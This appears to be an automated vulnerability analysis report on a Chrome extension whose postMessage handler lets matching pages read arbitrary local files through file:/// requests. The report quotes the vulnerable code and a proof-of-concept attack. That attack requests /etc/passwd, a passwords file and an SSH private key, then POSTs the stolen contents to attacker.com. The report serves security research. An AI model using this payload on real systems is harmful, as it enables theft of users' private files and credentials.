# CoCo Analysis: kjiiabkcjfbipdajbcipnbifomdmnhmg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → XMLHttpRequest_url_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kjiiabkcjfbipdajbcipnbifomdmnhmg/opgen_generated_files/cs_0.js
Line 475	    function(event)
Line 482		if (event.data.type && (event.data.type == "LOAD_FILE"))
Line 484			{ fileName: event.data.text },

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kjiiabkcjfbipdajbcipnbifomdmnhmg/opgen_generated_files/bg.js
Line 976		x.open("GET","file:///" + fileName, false);
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point at Lines 473-487
window.addEventListener(
    "message",
    function(event)
    {
	// We only accept messages from ourselves
	if (event.source != window)
	    return;

	if (event.data.type && (event.data.type == "LOAD_FILE"))
	    chrome.extension.sendMessage(
		{ fileName: event.data.text }, // ← attacker-controlled file path
		function(response) { window.postMessage(response, "*"); }); // ← sends file contents back
    },
    false);

// Background script (bg.js) - Lines 965-999
chrome.extension.onMessage.addListener(
    function(request, sender, sendResponse)
    {
	parseXMLChrome(request.fileName, sendResponse); // ← receives attacker-controlled fileName
    });

function parseXMLChrome(fileName, sendResponse)
{
    var x=new XMLHttpRequest();
    try
    {
	x.open("GET","file:///" + fileName, false); // ← arbitrary file read via file:/// protocol
	x.send();
    }
    catch(e)
    {
	sendResponse(
	    { type: "FILE_NOT_LOADED",
	      text: "Error loading local file: Unable to load file '" +
		    fileName +
		    "':" + e });
	return;
    }
    if (x.responseText==null || x.responseText=="")
    {
	sendResponse(
	    { type: "FILE_NOT_LOADED",
	      text: "Error loading local file: Unable to load file '" +
		    fileName +
		    "': File not found or empty ?" });
	return;
    }

    // Let the calling window know we've done it...
    sendResponse({ type: "FILE_LOADED", text: x.responseText }); // ← returns file contents
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event on whitelisted domains)

**Attack:**

```javascript
// From any page matching content_scripts matches patterns:
// - file:///*/index.html
// - http://localhost/BPTMPresentationLocal/*
// - http://bptm.nat.bt.com/BPTMPresentation/* or /BPTMPresentationTest/*

// Read arbitrary local file:
window.postMessage({
  type: "LOAD_FILE",
  text: "C:/Users/victim/Documents/passwords.txt" // Windows path
}, "*");

// Or on Linux/Mac:
window.postMessage({
  type: "LOAD_FILE",
  text: "/etc/passwd" // Linux system file
}, "*");

// Or read sensitive files:
window.postMessage({
  type: "LOAD_FILE",
  text: "C:/Users/victim/.ssh/id_rsa" // SSH private key
}, "*");

// Listen for file contents:
window.addEventListener('message', (e) => {
  if (e.data.type === 'FILE_LOADED') {
    console.log('Stolen file contents:', e.data.text);
    // Exfiltrate to attacker server:
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: e.data.text
    });
  }
});
```

**Impact:** Any webpage matching the content_scripts patterns can read arbitrary local files from the user's filesystem using the file:/// protocol. The extension has <all_urls> permission (manifest line 30), allowing it to make requests to any URL including file:/// URLs. This enables an attacker to:
1. Read sensitive files like SSH keys, credentials, configuration files
2. Read browser data (cookies, passwords stored in files)
3. Read documents, source code, and other private files
4. Exfiltrate the file contents to an attacker-controlled server

While the manifest restricts which pages can trigger this (specific localhost and bptm.nat.bt.com URLs, plus file:///*/index.html), according to methodology Rule 1, we classify as TRUE POSITIVE because a working attack path exists.
